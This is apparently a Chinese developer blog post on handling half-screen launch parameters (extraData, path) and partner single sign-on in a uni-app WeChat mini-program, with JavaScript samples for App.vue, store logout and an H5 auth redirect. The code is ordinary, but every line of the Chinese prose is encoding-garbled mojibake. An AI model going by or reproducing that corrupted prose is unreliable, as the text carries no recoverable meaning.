<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b71d3f6caa104544b410f7c352abc965~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2FuZ3Bx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457220&amp;x-signature=kjMsfR2%2F0sE3d9WbrUXthEkOig0%3D" alt="2abe8e13-7b1c-4358-a53a-f67382131344.png" loading="lazy"/></p>
<p>ä»æ–‡æ¡£ä¸­æˆ‘ä»¬å·²ç»å¾—çŸ¥ï¼Œä¸¤è€…ä¼ å‚æ–¹å¼éƒ½å¯ä»¥åœ¨appç”Ÿå‘½å‘¨æœŸ<code>onLaunch</code>,<code>onShow</code>ä¸­è·å–ï¼Œåªæœ‰<code>path</code>ä¼ é€’çš„å‚æ•°ï¼Œå¯ä»¥åœ¨é¡µé¢çº§ç”Ÿå‘½å‘¨æœŸ<code>onLoad</code>ä¸­å–å¾—ã€‚è¿™é‡Œå¤§å®¶å¼€å‘çš„æ—¶å€™ï¼Œä¸€å®šå¾—æ³¨æ„ã€‚</p>
<p>å…³äºå¦‚ä½•è·å–<code>extraData</code>å‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å°ç¨‹åºApp.vueçš„<code>onLaunch</code>ã€<code>onShow</code>ä¸­æŒ‰å¦‚ä¸‹æ–¹å¼è·å–ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
    <span class="hljs-comment">//onLaunch(opts) {</span>
        <span class="hljs-comment">// let extraData = opts?.referrerInfo?.extraData</span>
    <span class="hljs-comment">//},</span>
    <span class="hljs-comment">// å»ºè®®å¦‚æ— ç‰¹æ®Šè¦æ±‚åªæ‰§è¡Œä¸€æ¬¡ï¼Œè·å–extraDataå‚æ•°ï¼Œéƒ½åœ¨onShowä¸­æ‰§è¡Œ</span>
    onShow (opts) {
        <span class="hljs-keyword">let</span> extraData = opts?.<span class="hljs-property">referrerInfo</span>?.<span class="hljs-property">extraData</span>
    }
}
</code></pre>
<p>ä»ä¸Šæ¬¡é…åˆåŠå±æ‰“å¼€å°ç¨‹åºï¼Œå¼€å‘å•ç‚¹ç™»å½•çš„ç»éªŒæ¥çœ‹ï¼Œä¸€èˆ¬å†™åœ¨<code>onShow</code>ä¸­æœ€å¥½ï¼Œå¤§å®¶éƒ½çŸ¥é“ï¼Œ<code>onLaunch</code>åªåœ¨å°ç¨‹åºåˆå§‹åŒ–å®Œæˆæ—¶è§¦å‘ï¼Œ<code>onShow</code>åˆ™æ˜¯å½“å°ç¨‹åºå¯åŠ¨ï¼Œæˆ–æ¯æ¬¡ä»åå°è¿›å…¥å‰å°æ˜¾ç¤ºæ—¶éƒ½ä¼šè§¦å‘ã€‚å¦‚æœæ²¡æœ‰éœ€æ±‚è¯´åªè¦æ‰§è¡Œä¸€æ¬¡ï¼Œé‚£ä¹ˆä½¿ç”¨<code>onShow</code>åˆ™æ˜¯æœ€ä¸ºç¨³å¦¥ã€‚</p>
<p>æˆ‘å½“æ—¶å°±æ˜¯æœ€å…ˆå†™åœ¨<code>onLaunch</code>ä¸­ï¼Œå¯¼è‡´ä»–ä»¬ç«‹å…‹åŠå°ç¨‹åºç”¨æˆ·æ‰“å¼€æˆ‘ä»¬ä¸€ç æ¸¸å°ç¨‹åºï¼Œä¹‹åé€€å‡ºæˆ‘ä»¬å°ç¨‹åºå(ç”¨æˆ·æ²¡æœ‰åˆ é™¤æˆ‘ä»¬ä¸€ç æ¸¸å°ç¨‹åº)ï¼Œå†æ¬¡æ“ä½œï¼Œè¿™æ—¶ï¼Œç™»å½•å¤±è´¥ã€‚åŸå› å°±æ˜¯è¿›å…¥æˆ‘ä»¬å°ç¨‹åºï¼Œä¸ä¼šå†æ‰§è¡Œ<code>onLaunch</code>ä¸­çš„ä»£ç ï¼Œè·å–ä¸åˆ°<code>extraData</code>å‚æ•°ï¼Œä»è€Œå¯¼è‡´ç™»å½•å¤±è´¥ã€‚åæ¥æˆ‘åˆæ”¹åˆ°<code>onShow</code>ä¸­æ‰è§£å†³äº†é—®é¢˜ï¼Œå¦‚ä¸‹å›¾ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82fb935052fc4e299c636b33bbfb64c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2FuZ3Bx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457220&amp;x-signature=ry2xHV141IcHINfjPf5Pht833o8%3D" alt="2cd48bac-714f-4799-b0dc-f4bb3ab52d98.png" loading="lazy"/></p>
<h2 data-id="heading-3">äºŒã€åŒæ—¶åœ¨<code>path</code>ã€<code>extraData</code>ä¸­ä¼ äº†å‚ï¼Œè¢«åŠå±æ‰“å¼€çš„å°ç¨‹åºè¿™è¾¹ï¼Œå¦‚ä½•å¤„ç†å‚æ•°ï¼Ÿ</h2>
<p>æ‹¿æˆ‘ä»¬ä¸Šæ¬¡å¯¹æ¥ç«‹å…‹åŠä¸ºä¾‹ï¼Œåæ¥äº†è§£åˆ°ï¼Œä»–ä»¬æ˜¯è¿™æ ·ä¼ çš„å‚æ•°ï¼Œå¦‚ä¸‹å›¾ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9228a662e77743ae826b60e7b5ca4d28~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2FuZ3Bx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457220&amp;x-signature=8oo9Ve5efUfzLNJV9fv34FfcPTs%3D" alt="81bb6b34b67ffbcceadd63d319690459.png" loading="lazy"/></p>
<p><code>path</code>ä¸­ä¼ é€’äº†å‚æ•°<code>?cityCode=650200000000</code>,<code>extraData</code>ä¸­ä¼ äº†stateã€tokenã€‚ä»ç«‹å…‹åŠå°ç¨‹åºè·³è½¬è¿‡æ¥ï¼Œæ˜¯éœ€è¦ç›´æ¥è¿›å…¥æˆ‘ä»¬ä¸€ç æ¸¸å°ç¨‹åºçš„æŒ‡å®šåœ°åŒºçš„é¦–é¡µã€‚</p>
<p>ç”±äº<code>extraData</code>ä¸­ä¹Ÿæœ‰ä¼ å‚ï¼Œä½†å¤„ç†é€»è¾‘åªèƒ½åœ¨è¢«è·³è½¬çš„é¡µé¢ä¸­å¤„ç†ï¼Œæ‰€ä»¥æˆ‘åœ¨<code>app.onShow</code>ä¸­è·å–å‚æ•°åï¼Œå°†å‚æ•°å­˜å‚¨åˆ°äº†storeä¸­ï¼Œè¿™æ ·åœ¨é¡µé¢ä¸­å°±èƒ½è·å–åˆ°ä¼ é€’è¿‡æ¥çš„<code>extraData</code>å‚æ•°äº†ï¼ˆä¸è¿‡åœ¨å°ç¨‹åºé€€å‡ºæˆ–è€…é€€å‡ºç™»å½•æ—¶ï¼Œè®°å¾—é”€æ¯ï¼Œé¿å…å…¶ä»–ç”¨æˆ·ç™»å½•è¯¯ç”¨ç«‹å…‹åŠçš„ç™»å½•é€»è¾‘ï¼‰ã€‚</p>
<p>App.vue</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">onUnload</span>(<span class="hljs-params"/>){ 
    uni.<span class="hljs-title function_">setStorageSync</span>(<span class="hljs-string">'lkbToken'</span>, <span class="hljs-string">""</span>) 
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">$store</span>.<span class="hljs-title function_">commit</span>(<span class="hljs-string">'setExtraData'</span>, <span class="hljs-literal">null</span>) 
}
</code></pre>
<p>store/index.js</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">logout</span>(<span class="hljs-params">state</span>) {
    <span class="hljs-comment">// å…¶ä»–ä»£ç å·²çœç•¥</span>
    state.<span class="hljs-property">extraData</span> = <span class="hljs-literal">null</span>
    uni.<span class="hljs-title function_">setStorageSync</span>(<span class="hljs-string">'extraData'</span>, <span class="hljs-literal">null</span>)
    uni.<span class="hljs-title function_">setStorageSync</span>(<span class="hljs-string">'lkbToken'</span>,  <span class="hljs-string">""</span>)  
    uni.<span class="hljs-title function_">setStorageSync</span>(<span class="hljs-string">'platformOpenId'</span>,  <span class="hljs-string">""</span>)
}
</code></pre>
<h2 data-id="heading-4">ä¸‰ã€å®Œæ•´çš„åŠå±æ‰“å¼€å°ç¨‹åºï¼Œå•ç‚¹ç™»å½•åŠŸèƒ½æ¶‰åŠçš„æ”¹åŠ¨å¦‚ä¸‹ï¼š</h2>
<p>1ã€å°ç¨‹åº App.vue</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  onShow (opt) {
    <span class="hljs-keyword">let</span> extraData = opt?.<span class="hljs-property">referrerInfo</span>?.<span class="hljs-property">extraData</span>
    <span class="hljs-keyword">if</span>(extraData){
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">$store</span>.<span class="hljs-title function_">commit</span>(<span class="hljs-string">'setExtraData'</span>,extraData);
    }<span class="hljs-keyword">else</span>{
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">$store</span>.<span class="hljs-title function_">commit</span>(<span class="hljs-string">'setExtraData'</span>, <span class="hljs-literal">null</span>)
    }
  },
  <span class="hljs-title function_">onUnload</span>(<span class="hljs-params"/>){
    uni.<span class="hljs-title function_">setStorageSync</span>(<span class="hljs-string">'lkbToken'</span>, <span class="hljs-string">""</span>)  
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">$store</span>.<span class="hljs-title function_">commit</span>(<span class="hljs-string">'setExtraData'</span>, <span class="hljs-literal">null</span>)
  }
}
</code></pre>
<p>2ã€å°ç¨‹åº pages/index/main.vue</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
    <span class="hljs-title function_">data</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> {
            <span class="hljs-attr">q</span>: <span class="hljs-number">0</span>, <span class="hljs-comment">// æ˜¯å¦æ˜¯æ‰«ç /ä¼ å‚åˆ‡æ¢åŸå¸‚,åŸæ¥è®¾ç½®çš„æ˜¯-1ï¼Œä½†æ˜¯å½“ä¸º-1æ—¶æ°¸è¿œéƒ½ä¸å¯èƒ½ä¼šå±•ç¤ºæ¨èæ™¯åŒºå’ŒåŸå¸‚</span>
            query : {},
            lkbLoading : <span class="hljs-literal">false</span>
        };
    },
    <span class="hljs-title function_">onLoad</span>(<span class="hljs-params">opt</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">query</span> = opt
        <span class="hljs-comment">// æ‰«æäºŒç»´ç è¿›å…¥å°ç¨‹åºï¼ŒäºŒç»´ç å‚æ•°è·å–</span>
        <span class="hljs-keyword">if</span> (opt.<span class="hljs-property">q</span>) {
            <span class="hljs-keyword">const</span> query = <span class="hljs-built_in">decodeURIComponent</span>(opt.<span class="hljs-property">q</span>).<span class="hljs-title function_">split</span>(<span class="hljs-string">"?"</span>)[<span class="hljs-number">1</span>];
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">query</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">$qs</span>.<span class="hljs-title function_">parse</span>(query)
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">q</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">query</span>.<span class="hljs-property">cityCode</span>;
        } 
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (opt.<span class="hljs-property">cityCode</span>) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">q</span> = opt.<span class="hljs-property">cityCode</span>;
        }
        <span class="hljs-comment">// ç«‹å…‹åŠåŠå±æ‰“å¼€æˆ‘ä»¬å°ç¨‹åº,é»˜è®¤è¿›å…¥å…‹æ‹‰ç›ä¾é¦–é¡µ(è¿™é‡Œçš„opt.tokenæ˜¯ç«‹å…‹åŠçš„tokenå­—ç¬¦ä¸²)</span>
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getLkbBool</span>() ){
            opt.<span class="hljs-property">cityCode</span>= <span class="hljs-variable language_">this</span>.<span class="hljs-property">query</span>.<span class="hljs-property">cityCode</span> || <span class="hljs-string">'650200000000'</span> 
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">q</span> = opt.<span class="hljs-property">cityCode</span>;
            <span class="hljs-keyword">if</span> (!uni.<span class="hljs-title function_">getStorageSync</span>(<span class="hljs-string">"token"</span>)) {
                <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">likeBanLogin</span>()
            };
        }
        
         <span class="hljs-comment">// å…¶ä»–æ— å…³é€»è¾‘ç•¥...</span>
    },

    <span class="hljs-title function_">onShow</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getLkbBool</span>()){
            <span class="hljs-keyword">if</span> (!uni.<span class="hljs-title function_">getStorageSync</span>(<span class="hljs-string">"token"</span>)) {
                <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">likeBanLogin</span>()
            };
            <span class="hljs-keyword">return</span> 
        }
        
        <span class="hljs-comment">// å…¶ä»–æ— å…³é€»è¾‘ç•¥...</span>
    },
    <span class="hljs-attr">methods</span>: {
        <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦ç«‹å…‹åŠä¼ å‚</span>
        <span class="hljs-title function_">getLkbBool</span>(<span class="hljs-params"/>){
            <span class="hljs-keyword">const</span> extraData = <span class="hljs-variable language_">this</span>.<span class="hljs-property">$store</span>.<span class="hljs-property">getters</span>.<span class="hljs-property">extraData</span>;
            <span class="hljs-keyword">return</span> (extraData.<span class="hljs-property">token</span> &amp;&amp; extraData.<span class="hljs-property">state</span>===<span class="hljs-string">'likeban'</span>) || uni.<span class="hljs-title function_">getStorageSync</span>(<span class="hljs-string">"lkbToken"</span>)
        },
        <span class="hljs-comment">// è·å–å°ç¨‹åºç™»å½•ç”¨æˆ·openidç­‰ä¿¡æ¯</span>
        <span class="hljs-title function_">getOpenId</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
                uni.<span class="hljs-title function_">showLoading</span>();
                uni.<span class="hljs-title function_">login</span>({
                    <span class="hljs-comment">//è·å–ç™»å½•å‡­è¯</span>
                    <span class="hljs-attr">success</span>: <span class="hljs-function">(<span class="hljs-params">{ code }</span>) =&gt;</span> {
                        <span class="hljs-keyword">if</span> (code) {
                            <span class="hljs-keyword">let</span> url = <span class="hljs-string">""</span>;
                            <span class="hljs-comment">// #ifdef MP-WEIXIN</span>
                            url = <span class="hljs-string">"/auth/getOpenId"</span>;
                            <span class="hljs-comment">// #endif</span>
                            <span class="hljs-comment">// #ifdef MP-ALIPAY</span>
                            url = <span class="hljs-string">"/auth/getAliPayUserId"</span>;
                            <span class="hljs-comment">// #endif</span>
                            <span class="hljs-comment">//è·å– openid</span>
                            <span class="hljs-variable language_">this</span>.<span class="hljs-property">$http</span>.<span class="hljs-title function_">post</span>(url, {
                                <span class="hljs-attr">code</span>: code.<span class="hljs-title function_">split</span>(<span class="hljs-string">"&amp;"</span>)[<span class="hljs-number">0</span>],
                            }).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> {
                                uni.<span class="hljs-title function_">hideLoading</span>();
                                <span class="hljs-title function_">resolve</span>(res)
                            }).<span class="hljs-keyword">catch</span>(<span class="hljs-function">() =&gt;</span> {
                                uni.<span class="hljs-title function_">hideLoading</span>();
                                <span class="hljs-title function_">reject</span>()
                            });
                        }
                    },
                    <span class="hljs-title function_">fail</span>(<span class="hljs-params">err</span>) {
                        uni.<span class="hljs-title function_">hideLoading</span>();
                        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"uni.loginå¤±è´¥"</span>, err);
                        <span class="hljs-title function_">reject</span>(err)
                    },
                });
            })
        },
        <span class="hljs-comment">// ç«‹å…‹åŠç”¨æˆ·å•ç‚¹ç™»å½•</span>
        <span class="hljs-title function_">likeBanLogin</span>(<span class="hljs-params"/>){
            <span class="hljs-keyword">const</span> extraToken = <span class="hljs-variable language_">this</span>.<span class="hljs-property">$store</span>.<span class="hljs-property">getters</span>.<span class="hljs-property">extraData</span>?.<span class="hljs-property">token</span>;
            <span class="hljs-keyword">if</span>(extraToken){
                <span class="hljs-variable language_">this</span>.$set(<span class="hljs-variable language_">this</span>.<span class="hljs-property">query</span>,<span class="hljs-string">'token'</span>,extraToken)
                uni.<span class="hljs-title function_">setStorageSync</span>(<span class="hljs-string">"lkbToken"</span>,extraToken);
            }
            <span class="hljs-comment">// è¿™é‡Œçš„query.platformOpenIdæœ€ç»ˆæ²¡ç”¨åˆ°ï¼Œæœ€å…ˆä»å•†åŸè·³è½¬å›æ¥ä½¿ç”¨çš„ wx.miniProgram.switchTab,</span>
            <span class="hljs-comment">// å®é™…æµ‹è¯•å‘ç°æ— æ³•å¸¦å‚è·³è½¬ï¼Œæ”¹ä¸º wx.miniProgram.redirectTo è·³è½¬å›å°ç¨‹åºä¸­è½¬é¡µ pages/lkb/main.vue åï¼Œ</span>
            <span class="hljs-comment">// å·²ç»å°† platformOpenId å‚æ•°è®¾ç½®åœ¨äº†Storageä¸­ï¼ˆå¯æŸ¥çœ‹åé¢çš„ä»£ç ï¼‰</span>
            <span class="hljs-comment">//let platformOpenId = this.query.platformOpenId || uni.getStorageSync("platformOpenId"); </span>
            <span class="hljs-keyword">let</span> platformOpenId = uni.<span class="hljs-title function_">getStorageSync</span>(<span class="hljs-string">"platformOpenId"</span>);
            <span class="hljs-keyword">if</span> (!platformOpenId) {
                <span class="hljs-comment">// let url = `${process.env.VUE_APP_H5_HOST}/yytour/wechat/mp-auth?source=${process.env.VUE_APP_SOURCE}&amp;lkbToken=${extraToken}`;</span>
                <span class="hljs-keyword">let</span> url = <span class="hljs-string">`<span class="hljs-subst">${process.env.VUE_APP_H5_HOST}</span>/yytour/wechat/mp-auth?source=<span class="hljs-subst">${process.env.VUE_APP_SOURCE}</span>`</span>;
                uni.<span class="hljs-title function_">redirectTo</span>({
                        <span class="hljs-attr">url</span>: <span class="hljs-string">`/pages/webView/main?url=<span class="hljs-subst">${<span class="hljs-built_in">encodeURIComponent</span>(url)}</span>`</span>,
                });
                <span class="hljs-keyword">return</span> 
            } 

            !uni.<span class="hljs-title function_">getStorageSync</span>(<span class="hljs-string">"platformOpenId"</span>) &amp;&amp; uni.<span class="hljs-title function_">setStorageSync</span>(<span class="hljs-string">"platformOpenId"</span>, platformOpenId);
            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">lkbLoading</span>){
                <span class="hljs-keyword">return</span> 
            }
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">lkbLoading</span> = <span class="hljs-literal">true</span>;
            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getOpenId</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res</span>)=&gt;</span>{
                <span class="hljs-keyword">const</span> data = res.<span class="hljs-property">data</span>
                <span class="hljs-comment">// #ifdef MP-WEIXIN</span>
                uni.<span class="hljs-title function_">setStorageSync</span>(<span class="hljs-string">"openid"</span>, data.<span class="hljs-property">openId</span>);
                <span class="hljs-comment">// #endif</span>
                <span class="hljs-comment">// #ifdef MP-ALIPAY</span>
                uni.<span class="hljs-title function_">setStorageSync</span>(<span class="hljs-string">"aliPayUserId"</span>, data.<span class="hljs-property">aliPayUserId</span>);
                <span class="hljs-comment">// #endif</span>
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">$store</span>.<span class="hljs-title function_">commit</span>(<span class="hljs-string">"updateUserInfo"</span>, data);
                <span class="hljs-keyword">let</span> storageLkbToken = extraToken || <span class="hljs-variable language_">this</span>.<span class="hljs-property">query</span>.<span class="hljs-property">token</span> || uni.<span class="hljs-title function_">getStorageSync</span>(<span class="hljs-string">"lkbToken"</span>)
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">$http</span>.<span class="hljs-title function_">post</span>(<span class="hljs-string">"/auth/miniLoginOfLiKeBan"</span>, {
                    <span class="hljs-attr">openId</span>: data.<span class="hljs-property">openId</span>,
                    <span class="hljs-attr">platformOpenId</span>: data.<span class="hljs-property">platformOpenId</span> || uni.<span class="hljs-title function_">getStorageSync</span>(<span class="hljs-string">"platformOpenId"</span>),
                    liKeBanEncryptToken : storageLkbToken
                })
                .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> {
                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">$store</span>.<span class="hljs-title function_">commit</span>(<span class="hljs-string">"updateUserInfo"</span>, res.<span class="hljs-property">data</span>);
                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">$store</span>.<span class="hljs-title function_">commit</span>(<span class="hljs-string">"setToken"</span>, res.<span class="hljs-property">data</span>.<span class="hljs-property">token</span>);
                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">$store</span>.<span class="hljs-title function_">commit</span>(<span class="hljs-string">"setShopToken"</span>, res.<span class="hljs-property">data</span>.<span class="hljs-property">merchantToken</span>);
                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">lkbLoading</span> = <span class="hljs-literal">false</span>;
                    <span class="hljs-variable language_">this</span>.$nextTick(<span class="hljs-function">()=&gt;</span>{
                        <span class="hljs-comment">//this.autoMarketing()</span>
                    })
                }).<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">res</span>)=&gt;</span>{
                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">lkbLoading</span> = <span class="hljs-literal">false</span>;
                    <span class="hljs-keyword">if</span> (res.<span class="hljs-property">errorCode</span> === <span class="hljs-string">'00012'</span>) {
                        <span class="hljs-keyword">let</span> timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>{
                            uni.<span class="hljs-title function_">navigateTo</span>({
                                <span class="hljs-attr">url</span>: <span class="hljs-string">`/pages/login/main?redirect=true`</span> 
                            })
                            <span class="hljs-built_in">clearTimeout</span>(timer)
                        },<span class="hljs-number">1500</span>)
                    }
                    <span class="hljs-comment">// $http ä¸­å·²ç»åšæç¤ºï¼Œè¿™é‡Œå°±ä¸å†é‡å¤å†™äº†</span>
                    <span class="hljs-comment">// else{</span>
                            <span class="hljs-comment">// uni.showToast({ title: res.message, icon: 'none' })</span>
                    <span class="hljs-comment">// }</span>
                });
            })
        },
    }
}
</code></pre>
<p>ä¸Šé¢<code>likeBanLogin</code>æ–¹æ³•ä¸­æœ‰ä¸€æ®µä»£ç ï¼Œ</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> platformOpenId = <span class="hljs-variable language_">this</span>.<span class="hljs-property">query</span>.<span class="hljs-property">platformOpenId</span> || uni.<span class="hljs-title function_">getStorageSync</span>(<span class="hljs-string">"platformOpenId"</span>);
<span class="hljs-comment">// console.log('---likeBanLogin---platformOpenId---',platformOpenId)</span>
<span class="hljs-keyword">if</span> (!platformOpenId) {
    <span class="hljs-comment">// console.log('---likeBanLogin---!platformOpenId---')</span>
    <span class="hljs-keyword">let</span> url = <span class="hljs-string">`<span class="hljs-subst">${process.env.VUE_APP_H5_HOST}</span>/yytour/wechat/mp-auth?source=<span class="hljs-subst">${process.env.VUE_APP_SOURCE}</span>&amp;lkbToken=<span class="hljs-subst">${extraToken}</span>`</span>;
    uni.<span class="hljs-title function_">redirectTo</span>({
        <span class="hljs-attr">url</span>: <span class="hljs-string">`/pages/webView/main?url=<span class="hljs-subst">${<span class="hljs-built_in">encodeURIComponent</span>(url)}</span>`</span>,
    });
    <span class="hljs-keyword">return</span> 
} 
</code></pre>
<p>è¿™æ˜¯æˆ‘ä»¬ä»å•†åŸè·å–ç™»å½•æ¥å£çš„å¿…å¡«å‚æ•°<code>platformOpenId</code>,å•†åŸå‰ç«¯ç”¨çš„æ˜¯H5å¼€å‘çš„ï¼Œå…·ä½“ä¸ºå•¥è¦è·å–è¿™ä¸ªå‚æ•°ï¼Œè¿™æ˜¯è¿™ä¸ªé¡¹ç›®çš„ä¸€äº›åå°é€»è¾‘éœ€è¦ï¼Œæˆ‘ä»¬æ²¡å¿…è¦å»çº ç»“è¿™ä¸ªé—®é¢˜ã€‚</p>
<p>å•†åŸH5é¡µé¢ pages/mp-auth/index.vue</p>
<pre><code class="hljs language-js" lang="js">    <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
        <span class="hljs-title function_">created</span>(<span class="hljs-params"/>) {
          <span class="hljs-keyword">if</span> (!code) {
            <span class="hljs-variable language_">this</span>.$toAuthUrl() <span class="hljs-comment">// å»æˆæƒ è·å–code</span>
          } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// å·²è·å–code, è¿›è¡Œç™»å½•.</span>
            <span class="hljs-keyword">let</span> newMchId = (source == <span class="hljs-number">1</span> || source == <span class="hljs-number">0</span> || !source) ? mchId : -<span class="hljs-number">1</span>
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">$http</span>.<span class="hljs-title function_">post</span>(<span class="hljs-string">'merchant/mch-user/userInfoByCode'</span>, {
              code,
              <span class="hljs-attr">mchId</span>: newMchId
            }).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">{ data }</span>) =&gt;</span> {
              <span class="hljs-keyword">if</span> (!data) {
                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'ç™»å½•æ¥å£å‡ºé”™, dataä¸ºç©º'</span>)
                <span class="hljs-keyword">return</span>
              }
              <span class="hljs-comment">// ç«‹å…‹åŠç™»å½•å¤„ç†é€»è¾‘</span>
              <span class="hljs-keyword">if</span>(lkbToken){
                <span class="hljs-comment">// switchTab æ— æ³•å¸¦å‚æ•°è·³è½¬,ä½¿ç”¨ä¸€ä¸ªä¸­è½¬é¡µé¢`/pages/lkb/main`æ¥æ”¶å‚æ•°å¹¶å¤„ç†ç›¸åº”é€»è¾‘ï¼Œç„¶åä»ä¸­è½¬é¡µé¢è·³è½¬é¦–é¡µ`/pages/index/main`</span>
                <span class="hljs-comment">// wx.miniProgram.switchTab({</span>
                <span class="hljs-comment">//   url: `/pages/index/main?platformOpenId=${data.platformOpenId}&amp;token=${lkbToken}`</span>
                <span class="hljs-comment">// })</span>
                wx.<span class="hljs-property">miniProgram</span>.<span class="hljs-title function_">redirectTo</span>({
                  <span class="hljs-attr">url</span>: <span class="hljs-string">`/pages/lkb/main?platformOpenId=<span class="hljs-subst">${data.platformOpenId}</span>&amp;token=<span class="hljs-subst">${lkbToken}</span>`</span>
                })
              }<span class="hljs-keyword">else</span>{
                wx.<span class="hljs-property">miniProgram</span>.<span class="hljs-title function_">redirectTo</span>({
                  <span class="hljs-attr">url</span>: <span class="hljs-string">`/pages/login/main?platformOpenId=<span class="hljs-subst">${data.platformOpenId}</span>&amp;redirect=<span class="hljs-subst">${redirect}</span>`</span>
                })
              }
            })
          }
        }
    }
</code></pre>
<p>æœ¬æ¥ç™»å½•å‰ä»å°ç¨‹åºè·³è½¬åˆ°å•†åŸè¿™ä¸ªé¡µé¢è·å–åˆ°å‚æ•°åå°±å¯ä»¥ç›´æ¥è¿”å›å°ç¨‹åºé¦–é¡µçš„ï¼Œå¯è¦è¿”å›çš„å°ç¨‹åºé¡µé¢æ˜¯tabé¦–é¡µï¼Œ<code>wx.miniProgram.switchTab</code>çš„urlä¸­æ— æ³•ä¼ é€’queryå‚æ•°ï¼Œæˆ‘åªå¥½ä½¿ç”¨<code>wx.miniProgram.redirectTo</code>ï¼Œåˆç‰¹æ„åœ¨å°ç¨‹åºä¸­å»ºäº†ä¸€ä¸ªé¡µé¢æ–‡ä»¶ <code>pages/lkb/main.vue</code>ï¼Œç”¨äºåœ¨å°ç¨‹åºä¸­æ¥æ”¶ä»å•†åŸH5è·å–åˆ°çš„ç™»å½•æ¥å£å‚æ•°<code>platformOpenId</code>ã€‚</p>
<p>å°ç¨‹åº pages/lkb/main.vue</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
    <span class="hljs-title function_">onLoad</span>(<span class="hljs-params">opts</span>) {
        <span class="hljs-keyword">let</span> { platformOpenId, token } = opts;
        uni.<span class="hljs-title function_">setStorageSync</span>(<span class="hljs-string">"platformOpenId"</span>, platformOpenId);
        <span class="hljs-comment">//token &amp;&amp; uni.setStorageSync("lkbToken", token);</span>
        <span class="hljs-variable language_">this</span>.$nextTick(<span class="hljs-function">() =&gt;</span> {
            uni.<span class="hljs-title function_">switchTab</span>({
                <span class="hljs-attr">url</span>: <span class="hljs-string">"/pages/index/main"</span>
            });
        });
    },
};
